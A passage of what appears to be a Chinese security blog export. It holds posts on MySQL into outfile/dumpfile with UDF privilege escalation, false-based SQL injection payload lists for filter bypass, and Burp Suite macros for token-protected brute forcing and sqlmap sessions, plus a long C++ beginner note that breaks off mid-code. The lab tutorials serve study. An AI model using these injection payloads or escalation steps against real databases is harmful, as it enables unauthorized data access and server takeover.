虽然两个函数都可用于写入文件，但是区别很大： into outfile写文件时会在每行结束时自动加上换行符 into dumpfile写文件时会保持文件得到原始内容，对写入二进制文件时效果最好，例如在使用udf提权时上传二进制文件就只能用into dumpfile 但是当我们要导出数据库时，却不能用into dumpfile，因为dumpfile只能导出一行数据 into outfile不会覆盖文件 into outfile必须是查询语句的最后一句 路径名不能编码，且必须使用单引号 顺便复习一下udf.dll提权： 1234567891011121314mysql&gt; show variables like &apos;%plugin%&apos;;+-------------------------------+-------------------------------------------------------+| Variable_name | Value |+-------------------------------+-------------------------------------------------------+| default_authentication_plugin | mysql_native_password || plugin_dir | /usr/local/mysql-5.7.21-macos10.13-x86_64/lib/plugin/ |+-------------------------------+-------------------------------------------------------+2 rows in set (0.01 sec)mysql&gt; select * from func;Empty set (0.00 sec)mysql&gt; select unhex(&apos;udf.dll hex code&apos;) into dumpfile &apos;/usr/local/mysql-5.7.21-macos10.13-x86_64/lib/plugin/test.dll&apos;;ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement //因为新版本的mysql默认关闭了读写权限，先去打开]]></content>
      <tags>
        <tag>Owasp top 10</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于false的SQL注入]]></title>
    <url>%2F2018%2F03%2F12%2F%E5%9F%BA%E4%BA%8Efalse%E7%9A%84SQL%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[原理先来看两个sql查询语句 123456789101112131415161718mysql&gt; select Db,User from db where User=0;+--------------------+---------------+| Db | User |+--------------------+---------------+| performance_schema | mysql.session || sys | mysql.sys |+--------------------+---------------+2 rows in set, 3 warnings (0.00 sec)mysql&gt; select Db,User from db where Db=0;+--------------------+---------------+| Db | User |+--------------------+---------------+| test | 2test || performance_schema | mysql.session || sys | mysql.sys |+--------------------+---------------+3 rows in set, 3 warnings (0.00 sec) 这是基于false的注入，造成的原因是mysql隐式类型转换： 1234567两个参数比较时：有一个参数是NULL，比较结果就是NULL。（NULL&lt;=&gt;NULL会返回1）两个都是string类型或int类型时，直接比较有一个参数是timestamp或datetime，且另一个参数是常量时，常量被转换为时间戳，再进行比较有一个参数是decimal类型，且另一个是decimal或者int类型，int类型被转换为decimal类型然后比较 但是如果另一个参数是浮点类型，decimal类型会被转换为浮点数再比较其他情况下，两个参数都会被转换为浮点类型然后比较 造成以上查询结果的原因就是最后一点，因为当条件为where User=0时，2test字段开头是2，2！=0。而当条件为where Db=0时，三个字段都是字母开头，转换为浮点类型时会出现问题，字符串转化为浮点类型值为0，0=0成立，所以返回了查询结果 利用很多查询语句都是类似where id = ‘$id’;此时就能用到false注入： 1'+',查询语句为where id = ''+''; 在本地环境试验发现是查询成功的： 123456789101112131415161718mysql&gt; select Db,User from db where Db=&apos;&apos;+&apos;&apos;;+--------------------+---------------+| Db | User |+--------------------+---------------+| test | 2test || performance_schema | mysql.session || sys | mysql.sys |+--------------------+---------------+3 rows in set, 3 warnings (0.00 sec)mysql&gt; select Db,User from db where User=&apos;&apos;+&apos;&apos;;+--------------------+---------------+| Db | User |+--------------------+---------------+| performance_schema | mysql.session || sys | mysql.sys |+--------------------+---------------+2 rows in set, 3 warnings (0.00 sec) 类似的还有 1&apos;-&apos;、&apos;*&apos;、&apos;/1#、&apos;%1#、&apos;&amp;0#、&apos;|0#、&apos;^0#、&apos;&lt;&lt;0#、&apos;&gt;&gt;0# 因为除法和取余运算有点特殊，分母必须要有值才行，不然会爆语法错误。又因为#将后面的内容都注释了，所以在本地数据库实验的时候必须要在第二排加个结束的分号才能查询成功 123456789mysql&gt; select Db,User from db where User=&apos;&apos;/1#&apos;; -&gt; ;+--------------------+---------------+| Db | User |+--------------------+---------------+| performance_schema | mysql.session || sys | mysql.sys |+--------------------+---------------+2 rows in set, 3 warnings (0.00 sec) 或运算和异或运算也有点特殊，或运算符后面的值必须为假才能执行false查询操作 123456789mysql&gt; select Db,User from db where User=&apos;&apos;|0#&apos;; -&gt; ;+--------------------+---------------+| Db | User |+--------------------+---------------+| performance_schema | mysql.session || sys | mysql.sys |+--------------------+---------------+2 rows in set, 4 warnings (0.00 sec) 比较运算符会存在比较两次或者两次以上的情况，只要一步一步推就能发现也是符合false查询的本质的： 123&apos;=0&lt;=&gt;1# (&apos;=0&lt;=&gt;1#和&apos;=0=1#类似，唯一的区别是安全等于符号(&lt;=&gt;)能比较null的情况http://blog.csdn.net/yangfengjueqi/article/details/72821603)、&apos;=0&lt;&gt;0# (&lt;&gt;就是不等于符号，换成!=也可以,不过!=在sql2000中会报错。并且网上说的~=和^=都可以表示不等于，但是我在我本机上(5.7.21)实验发现这两个不等于并不能查询成功)、&apos;&gt;-1# 另外在安全客上看到过一些比较骚气的false查询： 123456789&apos;+1 is not null# 1 3&apos;in(-1,1)#‘like 1#&apos;regexp 1# regexp后跟的东西称为正则表达式处理&apos;between 1 and 1#&apos;div 1# 整除，例如3 div 2 = 1&apos;xor 1# 1 异或：f xor f=f,f xor t=t,t xor f=t,t xor t=f&apos;=round(0,1)=&apos;1 1 返回round(x,y)最近的y位小数（四舍五入）&apos;&lt;&gt;ifnull(1,2)=&apos;1 1 ifnull(x,y)，如果x不是null则返回x，否则返回y; 利用场景false注入可以利用在过滤了很多关键字时，因为一般的题目或者网站都会过滤一些常用的sql查询关键。 路还很长]]></content>
      <tags>
        <tag>sql注入</tag>
        <tag>Owasp top 10 </tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[burpsuite的宏应用]]></title>
    <url>%2F2018%2F03%2F02%2Fburpsuite%E7%9A%84%E5%AE%8F%E5%BA%94%E7%94%A8%2F</url>
    <content type="text"><![CDATA[从一开始接触安全就了解到了bp，但那时候仅仅只会抓包改包repeater，连基本的爆破生成csrf的poc都不会，慢慢接触多了以为自己就会使用bp了，还是太navie 下面是演示在使用bp进行爆破的时候，目标存在token参数该如何进行 实验准备环境搭建在我自己的虚拟主机上，源代码为： 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phpsession_start();$message = "";if ($_SERVER['REQUEST_METHOD'] == "POST") &#123; if (array_key_exists ("token", $_POST) &amp;&amp; array_key_exists ("token", $_SESSION)) &#123; if (array_key_exists ("token", $_SESSION)) &#123; if ($_POST['token'] == $_SESSION['token']) &#123; $message = "Success"; &#125; else &#123; $message = "Tokens don't match"; &#125; &#125; else &#123; $message = "Token not in session"; &#125; &#125; else &#123; $message = "Token not sent in POST"; &#125;&#125;$token = md5(mt_rand());$_SESSION['token'] = $token;?&gt;&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"&gt;&lt;html xmlns="http://www.w3.org/1999/xhtml" xml:&gt;&lt;head&gt; &lt;title&gt;Burp Suite Macro Demo Test Page&lt;/title&gt; &lt;meta name="Description" content="A page to use to practice with Burp Suite macros and session handling" /&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Burp Suite Test&lt;/h1&gt;&lt;p&gt;&lt;?=$message?&gt;&lt;/p&gt;&lt;form method="post" action="&lt;?=htmlentities ($_SERVER['PHP_SELF'])?&gt;"&gt; &lt;input type="submit" value="Submit" name="submit" /&gt; &lt;input type="hidden" value="" name="token" id="token" /&gt;&lt;/form&gt;&lt;script&gt; document.getElementById("token").value = "&lt;?=htmlentities ($token)?&gt;";&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 代码分析： 首先开始一个会话，同时生成token存储到session中。然后利用js将token写入到表单中并提交。如果这段js不运行的话token就为空。接着发起post请求，提交的token与session中存储的token进行比较。如果匹配则success，否则提示不匹配，并生成一个新的token值存储到session中。 值得注意的是，bp不会运行js，所以当使用bp的repeater或intruder模块时不会提交新的token值，会导致匹配不成功。解决方案就是利用宏模块 。 实验过程检查抓包 生成宏选择如图所示： 在Macros模块中选择add，在弹出的框里选择Record Macro 接着选择一个对目标成功发起的一个请求，点击OK，又返回宏编辑框中 然后点击Configure Item（配置项目） 这时并没有完，因为现在选择的token内容时从当前的post请求的token值，下一次就过期了不正确了。需要抓取js不断生成的token。点击add 在框里提供变量名字。然后在start after expression和end at delimiter框里分别输入参数值两端的值以确定参数值的位置，需要先点击一下Refetch response才能看到请求包的内容 点击ok回到上一窗口，发现此处有一个test macro按钮，可以测试抓取的参数值是否正确 经测试发现请求200正确 接着在Session Handing Rules栏中点击add，填上规则名称，点击add添加规则，会有一个下拉菜单,选择run a macro 进入新的页面选择之前保存的macro，在下面填入参数 进入scope,填入目标URL，点击OK 此时就能看到我们新添加的会话处理规则 测试规则是否有效，在repeater中重发多次包token参数值都在自动变化，返回都是success，证明规则有效 实验拓展除了以上的爆破利用外，还可以利用宏来维持登录会话，这次用dvwa做实验 实验本质：先登录dvwa，打开bp抓包，这时退出登录，抓取返回的user_token 再重新登录抓包 这时会发现退出登录时跳转的user_token值和登录时带的user_token值是相同的（这里遇到一个坑，如果两次分别抓包的话是不能得到两个相同的uesr_token值的，只能登出和登录操作完成后在cp的history模块找两次记录） 创建登录宏：梳理上面的流程，get请求login.php，获取登出时的user_token，接着发现账号密码和user_token登录。 录制宏，按住ctrl可以进行多选 配置项目需分别配置 第一个配置退出登录的get请求，跟前面一样 第一个配置登录的post请求，这里username，password和login都不变，user_token值使用宏的上一次get请求的返回值 我这里命名为login，test macro一下，发现user_token值一致，说明成功了 添加规则时动作可以选择check session is valid验证会话是否有效 如果页面跳转到login.php，则会话失效，此时运行一个宏，使用这个宏来登录 验证登录宏：将浏览器的cookie清除，输入地址，bp的登录宏直接登录，浏览器并没有跳转到登录界面 登录宏还可以用在sqlmap自动化注入上，有时网速或者目标服务器响应速度因素问题，注入进行的很慢，会话都过期了，这时可以用登录宏来重连，实现真正的自动化 利用—proxy参数，将流量指向bp，会话过期就自动重连 1sqlmap .......... --proxy http://127.0.0.1 路还很长]]></content>
      <tags>
        <tag>工具</tag>
        <tag>burpsuite</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[c++笔记]]></title>
    <url>%2F2018%2F02%2F28%2Fc-%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[编译过程：在学习语法之前，先了解下c++的编译过程： 1.使用编辑器编写程序并保存文件，这个文件就是源代码 2.编译源代码，将源代码编译为主机使用的机器语言。这个包含了编译后的程序的文件就是目标代码 3.将目标代码与其他代码链接起来。例如c++程序通常使用库，c++库包含一系列函数。链接指的是将目标代码同使用的函数的目标代码及一些标准的启动代码组合起来，生成程序的运行阶段版本，包含该最终产品的文件被称为可执行代码 可以用cc命令进行编译（可同时编译多个文件）： 1CC 1.cpp 这时会生成一个拓展名为o的目标代码文件，1.o 然后编译器会自动将目标代码文件传递给系统链接程序，该程序将代码与库代码结合起来，生成一个可执行文件1.out。如果只使用一个源文件，连接程序会将1.o文件删除。运行该程序直接输入文件名即可 Ps：如果编译新的可执行程序，新的可执行文件1.cpp会覆盖原有的1.cpp c++程序可以包含多个文件，可以通过在命令行上列出全部文件来编译程序 1CC 1.cpp 2.cpp 如果有多个源文件，则编译器不会删除目标代码文件，这样如果修改了1.cpp文件，则可用以下命令重新编译 1CC 1.cpp 2.o 这样可以重新编译1.cpp文件，并将它与前面的编译的2.o文件链接起来 当需要一些库时，如需要访问数学库函数时，需要在命令上加上-lm标记 1CC 1.cpp -lm 也可以用g++命令进行编译（最简单） 1g++ 1.cpp 会直接生成.out文件，直接运行.out文件即可 通常使用-o选项指定可执行程序的文件名 1g++ 1.cpp -o helloworld 此时生成一个名为helloworld的可执行程序 直接./helloworld执行即可 g++常用命令： 命令 解释 -ansi 只支持ansi标准。此命令将禁止gnu c的某些特色，例如asm或typeof关键词 -c 只编译并生成目标文件 -DMACRO 以字符串1定义MACRO宏 -DMACRO=DEFN 以字符串DEFN定义MACRO宏 -E 只运行c御编译器 -g 生成调试信息，gnu调试器可利用该信息 -IDIRECTORY 指定额外的头文件搜索路径DIRECTORY -LDIRECTORY 指定额外的函数库搜索路径DIRECTORY -ILIBRARY 连接时搜索指定的函数库LIBRARY -m486 针对486进行代码优化 -o 生成指定的输出文件 - O0 不进行优化处理 -O或-O1 优化生成代码 -O2 进一步优化 -O3 更近一步优化，包括inline函数 -shared 生成共享目标文件，通常用在建立共享库时 -UMACRO 取消对MACRO宏的定义 -w 不生成任何警告信息 -Wall 生成所有警告信息 基础教程：hello world1234567#include &lt;iostream&gt;using namespace std;int main()&#123; cout &lt;&lt; "hello world" &lt;&lt; endl; return 0;&#125; 上面的endl可以用\n代替，但是两者又有区别： \n表示内容为一个回车符的字符串，std::endl是流操作子 std::endl输出一个换行符，并立即刷新缓冲区 1std::cout &lt;&lt; std::endl; 等价于 1234std::cout &lt;&lt; '\n' &lt;&lt; std::flush;或std::cout &lt;&lt; '\n';std::fflush(stdout); 由于流操作符 &lt;&lt;的重载，对于’\n’和”\n”输出效果相同 对于有输出缓冲的流（例如cout、clog），如果不手动进行缓冲区刷新操作，将在缓冲区满后自动刷新输出。但是对于cout来说，缓冲一般体现不明显。不过用endl代替’\n’是好习惯 当不使用预处理using namespace std时，就要用std::cout cin用于从控制台获取用户输入，cout用于将数据输出到控制台。cin用&gt;&gt;，cout用&lt;&lt; 对于无缓冲的流（例如标准错误输出流cerr），刷新没必要，可以直接用’\n’ 三字符组三字符组就是用三个字符序列表示一个字符，三字符序列总是以两个问号开头 三字符组 替换字符 ??= # ??/ \ ??’ ^ ??( [ ??) ] ??! \ ??&lt; { ??&gt; } ??- ~ 如果需要两个连续的问哈且希望不被处理器替换，可以用转义字符”…?\?…”，或者字符串的自动连接”…?””?…” g++默认支持三字符组，但是会给出编译警告 注释c++的注释和c一样，但是还可以用#if 0 … #endif来实现注释 123#if 0 code#endif 数据类型与c相似，多了个宽字符型wchar_t（占4个字节），可用以下程序验证： 123456789101112#include&lt;iostream&gt;#include&lt;string&gt;#include &lt;limits&gt;using namespace std;int main()&#123; cout &lt;&lt; "wchar_t: \t" &lt;&lt; "所占字节数：" &lt;&lt; sizeof(wchar_t); cout &lt;&lt; "\t最大值：" &lt;&lt; (numeric_limits&lt;wchar_t&gt;::max)(); cout &lt;&lt; "\t\t最小值：" &lt;&lt; (numeric_limits&lt;wchar_t&gt;::min)() &lt;&lt; endl; return 0;&#125; typedef声明： 可以使用typedef为一个已有的类型取一个新的名字 12typedef int dingyi;dingyi i; /*和int i等价*/ 枚举类型枚举类型不一定要在main函数中定义 123456789101112#include &lt;iostream&gt;using namespace std;enum time&#123; first,second,third,forth,fifth&#125;num;int main()&#123; num = third; .....&#125; 上面的枚举类型也可写为： 123456789101112#include &lt;iostream&gt;using namespace std;enum time&#123; first,second.third,forth,fifth&#125;;int main()&#123; enum time a=third; .....&#125; 变量类型extern关键字可以在任何地方声明一个变量 1234567891011#include &lt;iostream&gt;using namespace std;extern int a; //声明一个变量int main()&#123; int a; //定义一个变量 a = 10; //初始化一个变量&#125; 变量的类型间是可以互相转换的，转换又分为自动转换和强制转换。 自动转换规则： 1、若参与运算量的类型不同，则先转换成同一类型，然后进行运算。 2、转换按数据长度增加的方向进行，以保证精度不降低。如int型和long型运算时，先把int量转成long型后再进行运算。 ​ a、若两种类型的字节数不同，转换成字节数高的类型 ​ b、若两种类型的字节数相同，且一种有符号，一种无符号，则转换成无符号类型 3、所有的浮点运算都是以双精度进行的，即使仅含float单精度量运算的表达式，也要先转换成double型，再作运算。 4、char型和short型参与运算时，必须先转换成int型。 5、在赋值运算中，赋值号两边量的数据类型不同时，赋值号右边量的类型将转换为左边量的类型。如果右边量的数据类型长度比左边长时，将丢失一部分数据，这样会降低精度: 1234int a=1;double b=2.5;a=b;cout &lt;&lt; a; //输出为 2，丢失小数部分 123int a = 1;double b = 2.1;cout &lt;&lt; &quot;a + b = &quot; &lt;&lt; a + b &lt;&lt; endl; //输出为a + b = 3.1 强制转换规则： 强制类型转换是通过类型转换运算来实现的。其一般形式为：（类型说明符）（表达式）其功能是把表达式的运算结果强制转换成类型说明符所表示的类型 123int a = 1;double b = 2.1;cout &lt;&lt; &quot;a + b = &quot; &lt;&lt; a + (int)b &lt;&lt; endl; //输出为a + b = 3 和变量对应的是常量，可以用const定义常量 如果用volatile修饰变量，变量的值可能以程序未明确指定的方式被改变，往往用于多线程的修饰 1234567891011volatile boolean isNext = false;Thread A()&#123; ...&#125;Thread B()&#123; if(isNext) &#123; ... &#125;&#125; 这里的volatile就是用来标记isNext，确保线程b每次都重新从内存中读取isNext的值，第二个工作一定在第一个工作后进行。但是需要注意的是，这里无法确保顺序性，因为编译的时候会重新打乱两个语句的先后顺序。 由restrict修饰的指针是唯一一种访问它所指向的对象的方式，只有c99增加了新的类型限定符restrict c++中的左值和右值左值：指向内存位置的表达式被称为左值表达式。左值可以出现在等号的左边或右边 右值：指存储在内存中某些地址的数值。右值不能对其进行复制，所以可以出现在等号右边，不能出现在等号左边 变量是左值，可以出现在等号左边。常量是右值，不能出现在等号左边 c++存储类auto存储类： auto关键字用于两种情况：声明变量时根据初始化表达式自动推断该变量的类型、声明函数时函数返回值的占位符 根据初始化表达式自动推断被声明的变量的类型： 1234auto f = 3.14; //double类型auto s("hello"); //const char*auto z = new auto(9); //int *auto x1 = 5,x2 = 5.0, x3 = 'r'; //报错，必须是初始化同一数据类型 register存储类： register存储类用于定义存储在寄存器中而不是RAM中的局部变量。所以变量的最大尺寸就是寄存器的大小，一般为一个词，且不能用&amp;运算符对其进行运算，因为没有内存的位置 123&#123; register int miles&#125; 寄存器只用于需要快速访问的变量，比如计数器。定义register的变量不一定呗存储在寄存器中 static存储类： 指示编译器在程序的生命周期内保持局部变量的存在，也可以用于全局变量，此时会使被修饰的全局变量作用域限制与声明的文件内 在c++中当static用于类数据成员上时，会导致仅有一个该成员的副本被类的所有对象共享 1234567891011121314151617181920212223#include &lt;iostream&gt; // 函数声明 void func(void); static int count = 10; /* 全局变量 */ int main()&#123; while(count--) &#123; func(); &#125; return 0;&#125;// 函数定义void func( void )&#123; static int i = 5; // 局部静态变量 i++; std::cout &lt;&lt; "变量 i 为 " &lt;&lt; i ; std::cout &lt;&lt; " , 变量 count 为 " &lt;&lt; count &lt;&lt; std::endl;&#125; 执行结果为 12345678910变量 i 为 6 , 变量 count 为 9变量 i 为 7 , 变量 count 为 8变量 i 为 8 , 变量 count 为 7变量 i 为 9 , 变量 count 为 6变量 i 为 10 , 变量 count 为 5变量 i 为 11 , 变量 count 为 4变量 i 为 12 , 变量 count 为 3变量 i 为 13 , 变量 count 为 2变量 i 为 14 , 变量 count 为 1变量 i 为 15 , 变量 count 为 0 extern存储类： extern用来在另一个文件中声明一个全局变量或函数，通常用于当有两个或多个文件共享相同的全局变量或函数的时候 mian.cpp: 12345678910#include &lt;iostream&gt;int count;extern void write_extern();int main()&#123; count = 5; write_extern();&#125; support.cpp 12345678#include &lt;iostream&gt;extern int count;void write_extern(void)&#123; std::cout &lt;&lt; "count is " &lt;&lt; count &lt;&lt; std::endl;&#125; 编译运行命令： 123g++ main.cpp support.cpp -o write./writecount is 5 mutable存储类： 仅适用于类的对象，允许对象的成员代替常量，也就是说可以通过const成员函数修改 thread_local存储类： 使用此修饰符的变量仅可在它创建的线程上访问，变量在创建线程时创建，在销毁线程时销毁。每个线程都有自己的变量副本 thread_local说明符可以和static或extern合并 可将thread_local仅应用于数据声明和定义，不能用于函数的声明或定义 1234567891011thread_local int x; //命名空间下的全局变量class x&#123; static thread_local std::string s; //类的static成员变量&#125;;static thread_local std::string x::s; //x::s是需要定义的void foo()&#123; thread_local std::vector&lt;int&gt; v; //本地变量&#125; 匿名函数lambdalambda表达式把函数看作对象，可以像对象一样使用，比如将他们赋值给变量作为参数传递，还可以像函数一样对其求值，表达式形式为： 1[capture](parameters)-&gt;return-type&#123;body&#125; 如： 12[](int x,int y)&#123;return x&lt;y;&#125;[](int x,int y)-&gt;&#123;int z=x+y; return z+x;&#125; 随机数随机数生成器有两个相关函数，一个是rand()，该函数只返回一个伪随机数，生成随机数之前需要调用srand()函数 1234567891011121314151617#include &lt;iostream&gt;#include &lt;ctime&gt;#include &lt;cstdlib&gt;using namespace std;int main()&#123; int i,j; srand((unsigned)time(NULL)); for(i=0;i&lt;10;i++) &#123; j=rand(); cout &lt;&lt; "随机数: " &lt;&lt; j &lt;&lt;endl; &#125; return 0;&#125; 指针和引用指针和引用的区别： 不存在空引用，引用必须连接到一块合法的内存 一旦引用被初始化为一个对象，就不能被指像到另一个对象。而指针可以在任何时候指向到另一个对象 引用必须在创建时被初始化。指针可以在任何时间被初始化 引用变量是一个别名，也就是说它是某个已存在变量的另一个名字。一旦把引用初始化为某个变量，就可以使用该引用名称或变量名称来指向变量 创建引用实例： 12345678910111213141516171819202122#include &lt;iostream&gt;using namespace std;int main()&#123; int i; double d; int&amp; r = i; double&amp; s = d; i = 5; cout &lt;&lt; "value of i is : " &lt;&lt; i &lt;&lt; endl; cout &lt;&lt; "value of i reference is : " &lt;&lt; r &lt;&lt; endl; d = 6.7; cout &lt;&lt; "value of d is : " &lt;&lt; d &lt;&lt; endl; cout &lt;&lt; "value of d reference is : " &lt;&lt; s &lt;&lt; endl; return 0;&#125; 运行结果为： 12345$ ./a.outvalue of i is : 5value of i reference is : 5value of d is : 6.7value of d reference is : 6.7 时间和日期时间库函数： time_t time(time_t *time) 返回系统的当前日历时间（自1970/1/1以来的秒数） char ctime(const time_t time) 返回一个表示当地时间的字符串指针，形式：day month year hours:minutes:seconds year\n\o struct tm localtime(const time_t time) 返回一个指向表示本地时间的tm结构的指针 clock_t clock(void) 返回程序开头，处理器时钟所使用的时间 char asctime(const struct tm time) 返回一个指向字符串的指针，字符串包涵了time所指向结构中存储的信息，形式为：day month date hours:minutes:seconds year\n\o struct tm gmtime(const time_t time) 返回一个指向time的指针，time为tm机构，用标准时间表示 time_t mktime(struct tm *time) 返回日历时间，相当于time所指向结构中存储的时间 double difftime(time_t time2,time_t time1) 返回time1和time2之间相差的秒数 size_t strftime() 用于格式化日期和时间为指定的格式 获取当前系统的本地时间： 123456789101112#include &lt;iostream&gt;#include &lt;ctime&gt;using namespace std;int main()&#123; time_t now = time(0); char *dt = ctime(&amp;now); cout &lt;&lt; "本地日期和时间: " &lt;&lt; dt &lt;&lt; endl;&#125; 使用结构tm格式化时间 直接用一个例子来了解tm结构 1234567891011121314151617#include &lt;iostream&gt;#include &lt;ctime&gt;using namespace std;int main()&#123; time_t now = time(0); cout &lt;&lt; "1970年到目前的秒数： " &lt;&lt; now &lt;&lt; endl; tm *ltm = localtime(&amp;now); cout &lt;&lt; "年：" &lt;&lt; 1900 + ltm-&gt;tm_year &lt;&lt; endl; cout &lt;&lt; "月：" &lt;&lt; 1 + ltm-&gt;tm_mon &lt;&lt; endl; cout &lt;&lt; "日：" &lt;&lt; ltm-&gt;tm_mday &lt;&lt; endl; cout &lt;&lt; "时间：" &lt;&lt; ltm-&gt;tm_hour &lt;&lt; ":"; cout &lt;&lt; ltm-&gt;tm_min &lt;&lt; ":"; cout &lt;&lt; ltm-&gt;tm_sec &lt;&lt; endl;&#125; 几个标准流：标准输入流： 标准输出流前面已经介绍了cout，标准输入流为cin 123456789101112#include &lt;iostream&gt;using namespace std;int main()&#123; char name[50]; cout &lt;&lt; "请输入你的名字："; cin &gt;&gt; name; cout &lt;&lt; "你的名字是：" &lt;&lt; name &lt;&lt; endl;&#125; 123./a.out 请输入你的名字：67你的名字是：67 标准错误流： 123456789#include &lt;iostream&gt;using namespace std;int main()&#123; char str[] = "error!"; cerr &lt;&lt; "error msg:" &lt;&lt; str &lt;&lt; endl;&#125; 12./a.out error msg:error! 标准日志流： 123456789#include &lt;iostream&gt;using namespace std;int main()&#123; char str[] = "login"; clog &lt;&lt; "log msg:" &lt;&lt; str &lt;&lt; endl;&#125; 12./a.out log msg:login 数据结构定义结构： 1234567struct Books&#123; char title[50]; char author[50]; char subject[100]; int book_id;&#125;book; 访问结构成员： 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;iostream&gt;#include &lt;cstring&gt;using namespace std;struct Books&#123; char title[50]; char author[50]; char subject[100]; int book_id;&#125;;int main()&#123; Books Book1; Books Book2; strcpy(Book1.title,"c++"); //strcpy(a,b)的作用是将b中的内容复制到a中 strcpy(Book1.author,"67"); strcpy(Book1.subject,"编程语言"); Book1.book_id = 10086; strcpy(Book2.title,"java"); strcpy(Book2.author,"69"); strcpy(Book2.subject,"编程语言"); Book2.book_id = 10001; cout &lt;&lt; "第一本书标题：" &lt;&lt; Book1.title &lt;&lt; endl; cout &lt;&lt; "第一本书作者：" &lt;&lt; Book1.author &lt;&lt; endl; cout &lt;&lt; "第一本书类：" &lt;&lt; Book1.subject &lt;&lt; endl; cout &lt;&lt; "第一本书ID：" &lt;&lt; Book1.book_id &lt;&lt; endl; cout &lt;&lt; "第二本书标题：" &lt;&lt; Book2.title &lt;&lt; endl; cout &lt;&lt; "第二本书作者：" &lt;&lt; Book2.author &lt;&lt; endl; cout &lt;&lt; "第二本书类：" &lt;&lt; Book2.subject &lt;&lt; endl; cout &lt;&lt; "第二本书ID：" &lt;&lt; Book2.book_id &lt;&lt; endl; return 0;&#125; 123456789$ ./a.out 第一本书标题：c++第一本书作者：67第一本书类：编程语言第一本书ID：10086第二本书标题：java第二本书作者：69第二本书类：编程语言第二本书ID：10001 结构作为函数参数： 1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;iostream&gt;#include &lt;cstring&gt; using namespace std;void printBook( struct Books book ); struct Books&#123; char title[50]; char author[50]; char subject[100]; int book_id;&#125;; int main( )&#123; Books Book1; Books Book2; strcpy( Book1.title, "C++"); strcpy( Book1.author, "67"); strcpy( Book1.subject, "后端"); Book1.book_id = 12345; strcpy( Book2.title, "html"); strcpy( Book2.author, "69"); strcpy( Book2.subject, "前端"); Book2.book_id = 12346; printBook( Book1 ); printBook( Book2 ); return 0;&#125;void printBook( struct Books book )&#123; cout &lt;&lt; "书标题 : " &lt;&lt; book.title &lt;&lt;endl; cout &lt;&lt; "书作者 : " &lt;&lt; book.author &lt;&lt;endl; cout &lt;&lt; "书类目 : " &lt;&lt; book.subject &lt;&lt;endl; cout &lt;&lt; "书 ID : " &lt;&lt; book.book_id &lt;&lt;endl;&#125; 123456789$ ./a.out 书标题 : C++书作者 : 67书类目 : 后端书 ID : 12345书标题 : html书作者 : 69书类目 : 前端书 ID : 12346 指向结构的指针： 定义指向结构的指针： 1struct Books *struct_pointer; 查找结构变量的地址： 1struct_pointer = &amp;Book1; 使用该指针访问结构成员： 1struct_pointer-&gt;title; 实例： 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;iostream&gt;#include &lt;cstring&gt;using namespace std;void printBook(struct Books *book);struct Books&#123; char title[50]; char author[50]; char subject[100]; int book_id;&#125;;int main()&#123; Books Book1; Books Book2; strcpy( Book1.title, "C++"); strcpy( Book1.author, "67"); strcpy( Book1.subject, "后端"); Book1.book_id = 12345; strcpy( Book2.title, "html"); strcpy( Book2.author, "69"); strcpy( Book2.subject, "前端"); Book2.book_id = 12346; printBook(&amp;Book1); printBook(&amp;Book2); return 0;&#125;void printBook(struct Books *book)&#123; cout &lt;&lt; "书标题：" &lt;&lt; book-&gt;title &lt;&lt; endl; cout &lt;&lt; "书作者：" &lt;&lt; book-&gt;author &lt;&lt; endl; cout &lt;&lt; "书类：" &lt;&lt; book-&gt;subject &lt;&lt; endl; cout &lt;&lt; "id：" &lt;&lt; book-&gt;book_id &lt;&lt; endl;&#125; 123456789./a.out 书标题：C++书作者：67书类：后端id：12345书标题：html书作者：69书类：前端id：12346 typedef关键字： typedef的作用是为结构类型取一个别名 1234567typedef struct&#123; char title[50]; char author[50]; char subject[100]; int book_id;&#125;Books; 也可以用来定义非结构类型 12typedef int *typedefint;typedefint x,y,z; x,y,z都是指向整型int的指针 面向对象类和对象：c++类和java一样，不过定义格式不同，c++定义类： 1234567class Box&#123; public: double length; double breadth; double height;&#125;; 定义对象： 12Box Box1;Box Box2; 继承：123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;iostream&gt;using namespace std;//基类class Shape&#123; public: void setWidth(int w) &#123; width = w; &#125; void setHeight(int h) &#123; height = h; &#125; protected: int width; int height;&#125;;//派生类class Rectangle: public Shape&#123; public: int getArea() &#123; return (width * height); &#125;&#125;;int main(void)&#123; Rectangle Rect; Rect.setWidth(5); Rect.setHeight(7); cout &lt;&lt; "Total area : " &lt;&lt; Rect.getArea() &lt;&lt; endl; return 0;&#125; 一个派生类继承了所有的基类方法，除了： 基类的构造函数、析构函数、拷贝函数 基类的重载运算符 基类的友元函数 多继承： 即一个子类可以有多个父类，继承了多个父类的特性 1234class &lt;派生类名&gt;:&lt;继承方式1&gt;&lt;基类名1&gt;,&lt;继承方式2&gt;&lt;基类名2&gt;....&#123; &lt;派生类类体&gt;&#125;; 实例： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;iostream&gt;using namespace std;//基类class Shape&#123; public: void setWidth(int w) &#123; width = w; &#125; void setHeight(int h) &#123; height = h; &#125; protected: int width; int height;&#125;;//基类class PaintCost&#123; public: int getCost(int area) &#123; return area * 70; &#125;&#125;;//派生类class Rectangle: public Shape, public PaintCost&#123; public: int getArea() &#123; return (width * height); &#125;&#125;;int main(void)&#123; Rectangle Rect; int area; Rect.setWidth(5); Rect.setHeight(7); area = Rect.getArea(); cout &lt;&lt; "Total area: " &lt;&lt; Rect.getArea() &lt;&lt; endl; cout &lt;&lt; "Total paint cost: $" &lt;&lt; Rect.getCost(area) &lt;&lt; endl; return 0;&#125; 运行结果为： 123$ ./a.out Total area: 35Total paint cost: $2450 重载函数重载： 123456789101112131415161718192021222324#include &lt;iostream&gt;using namespace std;class printData&#123; public: void print(i&#123;nt 